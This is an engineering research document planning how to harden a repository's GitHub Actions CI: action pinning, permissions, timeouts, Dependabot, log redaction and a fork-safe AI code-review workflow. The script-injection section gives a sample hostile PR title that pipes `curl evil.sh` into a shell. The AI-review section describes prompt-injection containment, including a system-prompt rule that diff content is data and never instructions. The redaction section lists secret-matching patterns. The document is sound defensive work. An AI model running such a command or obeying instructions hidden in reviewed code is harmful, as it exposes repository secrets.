# Phase 0 Research: Hardened GitHub Actions

**Feature**: 008-hardened-github-actions | **Date**: 2026-08-29

All Technical Context unknowns are resolved below. Every "measured" figure comes from the
live tree at `51f2deb`, not from the spec's prose — where the two disagree, the tree wins
and the discrepancy is called out (D-08, D-09).

---

## Baseline measurement

Commands run against the repository to establish the starting state:

```sh
# external action references, deduplicated
grep -rhoE 'uses: [^ ]+' .github/ | grep -v '\./\.github' | sort -u
# → 18 distinct actions, 0 pinned to a SHA

# jobs missing timeout-minutes or job-level permissions
# → 26 jobs total; 9 missing timeout, 24 missing job-level permissions

find . -name Dockerfile -not -path './website/*'   # → 12
grep -E '^\s+\./' go.work                           # → 14 modules
```

| Metric | Measured | FR / SC |
|---|---|---|
| External actions SHA-pinned | **0 / 18** | FR-003, SC-001 |
| Jobs with `timeout-minutes` | **17 / 26** | FR-004, SC-002 |
| Jobs with job-level `permissions` | **2 / 26** (`changes`, `report`) | FR-002, SC-002 |
| Workflows with top-level `permissions` | 5 / 5 ✅ already compliant | FR-001 |
| Workflows with `concurrency` | 2 / 5 (`ci`, `publish-edge`) | FR-005 |
| Dependabot gomod dirs | **1 / 14** | FR-017, SC-003 |
| Dependabot docker dirs | **1** — and `/` matches no Dockerfile, so it is a silent no-op | FR-019 |
| `dump-cluster-state` redaction | **none** — logs dumped verbatim | FR-014, SC-005 |
| AI review workflow | **does not exist** | FR-022…FR-025, SC-006 |

Two findings deserve emphasis because they are worse than "not yet done":

- **`gomod: /`** covers the repo root, which has no `go.mod` — it is a Go *workspace*
  (`go.work`). Dependabot does not traverse `go.work`. All 14 modules are therefore
  unmonitored today, not merely under-monitored. The Dependabot PRs currently open on
  `origin` (visible as `dependabot/go_modules/...` branches) come from the security-updates
  path, which scans independently of `updates:` — so version updates have never run for Go.
- **`docker: /`** likewise matches nothing; there is no root `Dockerfile`. Zero base-image
  updates have ever been proposed.

---

## D-01: SHA pinning method and comment format

**Decision**: Pin all 18 actions to full 40-character commit SHAs resolved from the current
floating tag, with a trailing `# vX.Y.Z` comment. Resolve via `git ls-remote --tags --refs`,
not by hand.

```yaml
- uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7.0.0
```

**Rationale**: A tag is a mutable pointer — an attacker with push access to an action repo
can re-point `v7` at a malicious commit and every consumer silently picks it up on the next
run. A SHA is immutable. The `# vX.Y.Z` comment is not decoration: it is the exact format
Dependabot's `github-actions` ecosystem parses and rewrites when it proposes an upgrade, so
the pin stays maintainable rather than freezing forever. `git ls-remote` needs no auth and
no token, which keeps the resolution reproducible by any contributor.

**Alternatives considered**:
- *Keep tags, add `dependabot` only* — rejected: Dependabot proposes upgrades but does
  nothing about a re-pointed tag between runs. It is a freshness tool, not an integrity one.
- *`pinact` / `frizbee` / `ratchet` as a CI auto-fixer* — rejected for now: adds a
  third-party binary to the trust base of the very gate meant to reduce third-party trust.
  Detection of unpinned refs is now handled by `zizmor` (adopted per ruling D-J); fixing is a
  human action. Worth revisiting if pins start drifting in practice.
- *Vendor the actions into `.github/actions/`* — rejected: enormous maintenance burden,
  and it forks security patches away from upstream.

**Resolved pin table**: [contracts/action-pins.md](./contracts/action-pins.md) — all 18
SHAs resolved and recorded, so implementation does not re-derive them.

---

## D-02: Least-privilege permission model

**Decision**: Set every workflow's top-level `permissions` to the minimum that workflow's
*most common* job needs (usually `contents: read`), and declare an explicit job-level
`permissions:` block on **every** job — including jobs that need nothing beyond
`contents: read`. Elevated scopes are declared only on the job that uses them.

The largest single win: `ci.yaml` currently grants `statuses: write` at the top level,
which every one of its 26 jobs inherits — including the 6 Kind e2e jobs that execute
untrusted PR-authored test code inside a cluster. Only the coverage-publishing steps in
`go`/`web` and the `report` job actually need it.

**Rationale**: An inherited token is a token available to every `run:` step, every
downloaded dependency, and every test binary in that job. Declaring per-job permissions
makes the blast radius of a compromised step equal to what that step legitimately needs.
Writing the block even when it is just `contents: read` makes the permissions audit surface
explicit and non-negotiable, preventing accidental inheritance creep.

**Alternatives considered**:
- *Top-level `permissions: {}` with per-job grants only* — this is the strictest posture and
  was seriously considered. Rejected because `actions/checkout` needs `contents: read` on a
  private-submodule fetch, and this repo has two submodules (`modules/`, `website/`); an
  empty default turns a missed job-level block into a confusing checkout failure rather than
  a clean permission error. `contents: read` as the floor is the pragmatic equivalent.
- *Leave inheritance and document it* — rejected: fails FR-002 and SC-002 outright.

**Full matrix**: [contracts/permissions-matrix.md](./contracts/permissions-matrix.md).

---

## D-03: Timeout policy

**Decision**: Every job gets `timeout-minutes`. Ceiling is 30 minutes; per ruling D-A the five
E2E jobs are the only documented exceptions above it, each requiring an inline comment stating
why:

| Job | Timeout | Justification |
|---|---|---|
| `e2e-go` (all matrix legs) | 60 | Boots a kind cluster, installs the chart, runs the bucket's suite. |
| `e2e-multicluster` | 60 | Same, across two clusters. |
| `e2e-upgrade` | 60 | Same, plus a chart upgrade across versions. |
| `e2e-web-live` | 60 | Same, plus a live dashboard drive. |
| `e2e-game-bot` | 60 | Pulls multi-GB game images, boots real servers, runs protocol joins. |

The remaining D-A budgets sit at or below the 30 ceiling and are not exceptions:
`images.game-images` 10, `images.common-base` 10 [EXTENSION], `release.images` 15,
`release.chart`/`github-release`/`modules` 15 [EXTENSION], `publish-edge.images` 15,
`republish-modules.modules` 15 [EXTENSION].

Everything else is ≤ 30. The 9 currently-unbounded jobs are all in the publish/release
workflows, which is the worst place to be unbounded — a hung `docker push` holding a
registry credential burns runner minutes indefinitely.

**Rationale**: The default is 360 minutes (6 hours). An unbounded job that hangs on a
network stall does not fail — it idles for six hours and then fails, which on a public repo
is both a cost and a queue-starvation problem. Explicit per-job values also document
expected duration, making regressions visible.

**Alternatives considered**: a single repo-wide default via `defaults:` — GitHub Actions
has no such key for `timeout-minutes`; it must be per-job. Rejected as impossible, not
undesirable.

---

## D-04: Script-injection posture

**Decision**: Keep the existing "user input via `env:` only" convention. Enforce it by linting
for expression-injection, detecting any `${{ github.event.*.title | *.body | *.ref |
*.label.* | *.head.ref }}` or `${{ github.head_ref }}` appearing inside a `run:` block.

**Measured**: the current tree is **already clean**. Four interpolations of `github.event.*`
exist (`ci.yaml:490, 1039, 1042, 1379`) and all four bind to an `env:` key first —
`HEAD_SHA`, `PR_NUMBER` — and are referenced as `"$HEAD_SHA"` inside the script. Both values
are additionally attacker-uncontrolled (a SHA and an integer).

**Rationale**: `${{ }}` is textually substituted into the shell script *before* the shell
parses it, so a PR titled `"; curl evil.sh | sh; #` executes. Binding to `env:` moves the
value into the process environment where the shell treats it as data. The convention holds
today; the risk is a future PR reintroducing it, which is precisely what a mechanical gate
prevents. FR-006 is therefore a *lock-in*, not a repair.

**Enforcement**: `actionlint` in CI. It is purpose-built for this analysis and catches
expression-injection patterns (including the `github.event.*` cases here) via real expression
parsing rather than heuristics. Originally rejected as adding external dependencies; **REVERSED
by ruling D-H** in favor of adoption per the maintainer's reasoning: "adding new third party is
not an issue if it would really improve CI". `actionlint` is maintained externally and does this
job better than a hand-written rule would.

---

## D-05: AI review workflow — trigger model and fork safety

**Decision**: Two-workflow `workflow_run` split.

1. `ai-review.yaml`, job `collect`: triggered by `pull_request`, `permissions: contents:
   read` only, no secrets. Checks out the PR head, produces the diff and metadata, uploads
   them as an artifact. Runs with the untrusted code but with no capability.
2. `ai-review.yaml`, job `review`: triggered by `workflow_run: {workflows: [ai-review],
   types: [completed]}`, runs from the **base** branch's workflow definition, holds
   `ANTHROPIC_API_KEY` and `pull-requests: write`, downloads the artifact, and **never
   checks out or executes PR code**.

**Rationale**: This is the only pattern that gives a fork PR an AI review with a write-back
comment without ever putting a privileged token in the same job as attacker-controlled code.
The alternative everyone reaches for, `pull_request_target`, does exactly the wrong thing:
it runs with full secrets *and* a write token, and the moment anyone adds a checkout of
`github.event.pull_request.head.sha` it becomes remote code execution against the repo's
secrets. FR-023 is unambiguous that fork PRs must be read-only, and `workflow_run` is how
that is achieved rather than asserted.

For same-repo PRs the split costs one extra queued run; that is the price of a uniform code
path rather than a branch that behaves differently for trusted authors — a branch is exactly
where this class of bug hides.

**Alternatives considered**:
- *`pull_request_target`* — rejected, see above. Explicitly forbidden in this feature's
  Constraints.
- *`pull_request` only, degrade to `$GITHUB_STEP_SUMMARY` on forks* — simpler and genuinely
  safe, but fork contributors (the ones who most need spec-compliance feedback) would never
  see a comment, and secrets are unavailable so no AI call is possible at all on a fork.
  Fails FR-024's sticky-comment requirement for the fork case.
- *`issue_comment` opt-in trigger (`/review`)* — rejected as the primary path: requires a
  maintainer action on every PR, so the gate is only as reliable as someone remembering.
  Reasonable as a future re-run affordance.

---

## D-06: Prompt-injection containment

**Decision**: Four layers, all in `ai-review.yaml`:

1. **Structural framing** — the diff is passed inside a delimited block explicitly labelled
   untrusted, with the system prompt stating that content within it is data to be reviewed
   and never instructions to be followed.
2. **Metadata sanitisation** — PR title, body, branch name and commit messages are stripped
   of backticks and `${`, truncated to fixed lengths, and passed as separate labelled
   fields rather than concatenated into prose.
3. **Capability floor** — the reviewer runs with no shell tool and no network beyond the
   API call. Even a fully successful injection has nothing to reach for.
4. **Advisory-only output** — the review posts a comment and never fails the build,
   `continue-on-error: true` on the review step. A hijacked reviewer therefore cannot block
   a legitimate PR, and cannot approve a malicious one either — it has no approval right.

**Rationale**: Layers 1 and 2 reduce the odds; only 3 and 4 bound the damage. Treating a
diff as untrusted input is the same discipline the codebase already applies in
`gameaction/` — validate at every boundary, never assume the other side checked.

**Alternatives considered**: a "does this diff contain injection?" pre-classifier — rejected
as security theatre; it is itself an LLM call with the same weakness, and a false negative
gives false confidence.

---

## D-07: `dump-cluster-state` redaction

**Decision**: Pipe every log and describe stream through a `sed` redaction filter before it
reaches a step summary or artifact, and never dump Secret objects.

Filter targets, applied case-insensitively:
`(password|passwd|token|secret|api[-_]?key|bearer|authorization|BEGIN [A-Z ]*PRIVATE KEY)`
followed by a value → value replaced with `***REDACTED***`. Plus a bare-JWT pattern
(`eyJ[A-Za-z0-9_-]{10,}\.`) for tokens that appear without a labelled key.

**Measured**: the action is 178 lines and contains **no** redaction. It runs `kubectl
describe pods` (which prints literal `env:` values inline) and dumps operator, API, and game
container logs verbatim. The e2e suites bootstrap admin users and mint session tokens, so
credential material demonstrably passes through those logs.

**Rationale**: SC-005 requires 100% of failure dumps to be sanitised. Redaction must be at
the *emit* boundary inside the composite action, not at the consumer, because artifacts and
step summaries are both retained and both readable by anyone who can see the run — on a
public repo, that is everyone.

**Enforcement**: The `redact()` filter itself is implemented. The automated wiring check
(R10 in the now-deleted verifier) is **no longer enforced**, so nothing will fail CI if the
filter is accidentally removed or unwired. This is a known gap (per the ruling D-F). The
responsibility to keep the filter wired rests on code review and the testing that validates
the filter works.

**Alternatives considered**:
- *Rely on GitHub's automatic secret masking* — rejected: it masks only values registered
  via `secrets.*` or `add-mask`. Tokens minted *inside* the cluster at test time are
  unknown to the runner and pass through unmasked. This is the exact gap.
- *Stop dumping container logs* — rejected: they are the single most useful artifact when an
  e2e job fails, and removing them would trade a real debugging capability for a problem a
  filter solves.

---

## D-08: Dependabot directory list — spec correction

**Decision**: Derive the directory lists mechanically rather than transcribing FR-019's
prose, and correct the spec's list where the tree disagrees.

FR-019 lists Docker directories as `/`, `/agent`, `/api`, `/audit-syslog-bridge`,
`/capture-sidecar`, `/mcp-server`, `/operator`, `/sentinel`, `/telemetry-receiver`,
`/tunnel`, `/images/common/steamcmd`, `/images/games/nuclear-option`.

The tree says otherwise:

| Spec says | Tree says | Action |
|---|---|---|
| `/` has a Dockerfile | It does not | **Drop** — a no-op entry today |
| `/tunnel` has a Dockerfile | It does not (`tunnel/` is a Go module, no image) | **Drop** |
| — | `/test/e2e/Dockerfile` exists | **Add** |
| — | `/web/Dockerfile` exists | **Add** |

Final: 12 docker directories, exactly matching `find . -name Dockerfile -not -path
'./website/*'`. The 14 gomod directories come from `go.work` verbatim.

**Enforcement**: The two lists must stay in sync as modules and images are added. This is a
manual discipline; nothing now fails CI when a 15th Go module or 13th Dockerfile is added
without updating Dependabot, which is precisely the failure that left all 14 Go modules
unmonitored for this repo's whole life. This is a known gap (per the ruling D-F). Code review
is the control; consider revisiting this check (~40 lines) if it becomes a recurring problem.

**Alternatives considered**: `directories:` (plural, glob-capable) in one entry per
ecosystem — supported by Dependabot and much shorter. Rejected because per-directory
`groups:` and independent `open-pull-requests-limit` are what actually control PR volume
across 14 modules, and those are per-entry. Revisit if the config becomes unwieldy.

---

## D-09: Dependabot grouping and PR-volume control

**Decision**: Per-entry grouping with these rules:

- Each of the 14 Go modules: one group `<module>-minor-patch` matching `update-types:
  ["minor", "patch"]` across all dependencies. Major bumps come as individual PRs.
- `web/`: one group `npm-minor-patch` matching `update-types: ["minor", "patch"]` across all
  dependencies. Major bumps come as individual PRs.
- Docker: one group per directory, all update types.
- GitHub Actions: a single `actions` group, all update types — pin churn is safe to batch.
- `open-pull-requests-limit: 5` per Go module (14 × 5 worst case is still bounded), `10` for
  npm, `5` for docker, `5` for actions.
- Schedule: weekly, Monday 03:00 UTC for all ecosystems.
- `commit-message.prefix: "chore(deps)"` with `include: "scope"` — note this corrects the
  current config's `"chore: "`, which yields a malformed `chore: (deps):` subject.

**Rationale**: The spec's own edge case names PR floods as the risk; 28 ungrouped entries
across a 14-module workspace could open dozens of PRs in one Monday morning, each triggering
a full CI run. Grouping minor/patch collapses the common case to one PR per module while
keeping majors — the ones that actually break builds — individually reviewable.

**Alternatives considered**:
- *One group across all 14 modules* — rejected: a single failing module blocks the whole
  group's PR, and `go.work` modules have genuinely independent dependency graphs.
- *Daily schedule* — rejected: 5× the CI load for updates nobody merges same-day. Security
  updates bypass the schedule anyway, which is the case where latency actually matters.

**Full matrix**: [contracts/dependabot-matrix.md](./contracts/dependabot-matrix.md).

---

## D-10: Enforcement approach — verifier deleted, actionlint and zizmor adopted

**History**: A POSIX-shell verification script (`.github/workflows-verify.sh`) with nine rules
was designed to enforce SC-001…SC-004 as "100%" claims. It was never requested and was
included as the justification for passing a constitution gate it should not have needed. Per
ruling D-F, the entire verifier subsystem is **deleted**: the script, its Python rule modules,
and all references to it in spec artifacts.

**Enforcement**: Enforcement moves to the workflow-lint gate (actionlint + zizmor), per ruling D-H and extended per ruling D-J.

`actionlint` is externally maintained and purpose-built for GitHub Actions linting. It provides:

- Detection of malformed `timeout-minutes` keys via workflow schema validation
- Detection of expression-injection into `run:` bodies via real GitHub expression parsing
- Schema and syntax validation, deprecated syntax detection, and shellcheck-level analysis of script bodies

`zizmor` (adopted per ruling D-J to close gaps left by actionlint's coverage) provides:

- Detection of unpinned `uses:` references (the old R1, necessary for SC-001)
- Detection of permissions misuse (the old R2)
- Detection of `pull_request_target` misuse (the old R9)

**Why zizmor was necessary**: Ruling D-H's claim that actionlint covers "unpinned and malformed
action `uses:` references" was verified against actionlint's own `docs/checks.md` and found to be
false. Actionlint's "Action format in uses:" check validates only the syntactic shape
`owner/repo@ref` and accepts `v4` tags; it has no SHA-pinning rule. Zizmor closes this gap plus
two others (permissions and pull_request_target misuse), making it the single dependency needed
to close the three integrity controls the verifier previously enforced separately.

**Known gaps** (not covered by the workflow-lint gate and enforced by code review only):

- **Dependabot↔tree parity check**: adding a 15th Go module or 13th Dockerfile will no
  longer fail CI unless Dependabot is updated. This is the precise failure mode that left
  all 14 Go modules unmonitored for this repo's entire life. Code review is the control; the
  check itself (~40 lines) is a strong candidate for resurrection if this becomes a recurring problem.
- **`dump-cluster-state` redaction wiring**: nothing verifies the filter remains wired, only
  that it was initially implemented. The filter itself stays; the check does not.
- **Timeout PRESENCE and VALUES**: `actionlint` catches malformed `timeout-minutes` keys (schema
  only) but does not enforce presence on every job or validate that values match the policy set
  in D-03. Ruling D-A sets the specific thresholds; code review is the enforcement.
- **Concurrency PRESENCE**: no automated check that every job needing it has a `concurrency` block.
- **SHA-pin comments**: the `# vX.Y.Z` convention beside each pinned action SHA is not machine-checked.
  It is essential for Dependabot upgrade rewrites to work; code review must verify the format.

**Wiring**: Implementation adds a `workflow-lint` job to `ci.yaml`, gated on a new `github`
path filter, running `actionlint` and `zizmor` over `.github/workflows/`. The actions are SHA-pinned like
every other dependency, and the job is added to `report`'s `needs`, `NEEDS_ORDER`, and
`JOB_MATCHERS` (all three, or it is silently missing from the PR comment).

---

## Open items carried into `/speckit-tasks`

None blocking. Two judgement calls to confirm during implementation:

- The exact `anthropics/claude-code-action` version to pin — resolve at implementation time
  with the same `git ls-remote` method, since it is the one action not currently in the tree.
- Whether `images.yaml` should gain a `concurrency` group with `cancel-in-progress`. It
  triggers on `workflow_dispatch` + `pull_request` + `push`, and concurrency would be useful
  for PRs. Leaning yes, keyed on `${{ github.workflow }}-${{ github.ref }}` with
  `cancel-in-progress: true` for PRs only, since cancelling a master publish mid-push is
  undesirable.
